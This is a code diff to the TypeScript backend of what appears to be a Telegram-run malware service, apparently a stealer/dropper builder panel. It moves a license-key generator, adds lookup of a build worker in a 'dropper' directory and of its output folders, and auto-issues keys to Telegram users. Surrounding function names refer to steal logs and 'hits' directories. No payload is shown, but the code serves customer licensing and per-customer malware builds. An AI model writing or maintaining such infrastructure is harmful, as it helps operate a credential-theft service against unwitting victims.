@@ -5,6 +5,25 @@ import fs from "fs";
 import path from "path";
 import { dbPath, panelBase, panelBases } from "./config";
 
+const KEY_ALPHABET = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
+
+function randomGroup() {
+  const bytes = randomBytes(4);
+  let out = "";
+  for (let i = 0; i < 4; i++) out += KEY_ALPHABET[bytes[i] % KEY_ALPHABET.length];
+  return out;
+}
+
+export async function makeKey() {
+  const d = open();
+  for (let i = 0; i < 30; i++) {
+    const key = `NF-${randomGroup()}-${randomGroup()}-${randomGroup()}-${randomGroup()}`;
+    const row = d.prepare("SELECT key FROM keys WHERE key = ?").get(key);
+    if (!row) return key;
+  }
+  throw new Error("key space exhausted");
+}
+
 export type KeyRow = {
   key: string;
   note: string;
@@ -246,25 +265,6 @@ export async function listUsers(limit = 80) {
   return rows.map((r) => toUserRow(r as Record<string, unknown>));
 }
 
-const KEY_ALPHABET = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
-
-function randomGroup() {
-  const bytes = randomBytes(4);
-  let out = "";
-  for (let i = 0; i < 4; i++) out += KEY_ALPHABET[bytes[i] % KEY_ALPHABET.length];
-  return out;
-}
-
-export async function makeKey() {
-  const d = open();
-  for (let i = 0; i < 30; i++) {
-    const key = `NF-${randomGroup()}-${randomGroup()}-${randomGroup()}-${randomGroup()}`;
-    const row = d.prepare("SELECT key FROM keys WHERE key = ?").get(key);
-    if (!row) return key;
-  }
-  throw new Error("key space exhausted");
-}
-
 export async function userActive(tgId: number): Promise<{ ok: boolean; why: string }> {
   const user = await getUser(tgId);
   if (!user?.key) return { ok: false, why: "activation required" };
@@ -476,12 +476,42 @@ export async function lastBuildAt(tgId: number) {
   return num(row?.created_at, 0);
 }
 
-export function spawnBuildOne(buildId: number) {
+function buildWorkerCandidates() {
   const root = projectRoot();
-  const script = path.join(root, "tools", "panel_build.mjs");
-  if (!fs.existsSync(script)) {
-    throw new Error("build worker missing");
+  return [
+    path.join(root, "dropper", "tools", "panel_build.mjs"),
+    path.join(root, "tools", "panel_build.mjs"),
+  ];
+}
+
+// panel_build writes into <appRoot>/dist, and appRoot is wherever its tools/
+// directory sits — derive the served roots from the worker, not from a guess,
+// so the split (dropper/ + core/) and the flat layout both resolve.
+export function distRoots() {
+  const dirs = new Set<string>([path.resolve(projectRoot(), "dist")]);
+  for (const script of buildWorkerCandidates()) {
+    if (fs.existsSync(script)) {
+      dirs.add(path.resolve(path.dirname(path.dirname(script)), "dist"));
+    }
   }
+  return [...dirs];
+}
+
+function resolveBuildWorker() {
+  const root = projectRoot();
+  const candidates = buildWorkerCandidates();
+  const script = candidates.find((c) => fs.existsSync(c));
+  if (!script) {
+    throw new Error(`build worker missing (tried: ${candidates.join("; ")})`);
+  }
+  // <appRoot>/tools/panel_build.mjs -> <appRoot>: res/, src/, dist/ and the
+  // electron package.json all live next to tools/, while core/ stays at root.
+  const appRoot = path.dirname(path.dirname(script));
+  return { root, script, appRoot };
+}
+
+export function spawnBuildOne(buildId: number) {
+  const { root, script, appRoot } = resolveBuildWorker();
   fs.mkdirSync(botDir(), { recursive: true });
   const outLog = path.join(botDir(), `build_${buildId}.log`);
   const pidFile = path.join(botDir(), `build_${buildId}.pid`);
@@ -492,7 +522,8 @@ export function spawnBuildOne(buildId: number) {
       script,
       "--id", String(buildId),
       "--db", dbPath(),
-      "--root", root,
+      "--root", appRoot,
+      "--src-root", root,
       "--base", panelBase(),
       "--bases", panelBases().join(","),
     ],
@@ -836,4 +867,17 @@ export async function latestStealLog(tgId: number, windowSec = 1800) {
 
 export function hitsDir() {
   return path.join(botDir(), "data", "hits");
+}
+
+export async function ensureKey(tgId: number) {
+  const d = open();
+  ensureUserRow(d, tgId);
+  const row = d.prepare("SELECT key FROM users WHERE tg_id = ?").get(tgId) as
+    | { key: string | null }
+    | undefined;
+  if (row?.key) return;
+  const key = await makeKey();
+  await insertKey(key, 365, "auto-generated");
+  d.prepare("UPDATE users SET key = ? WHERE tg_id = ?").run(key, tgId);
+  console.log(`[db] ensured key for tgId=${tgId}: ${key}`);
 }
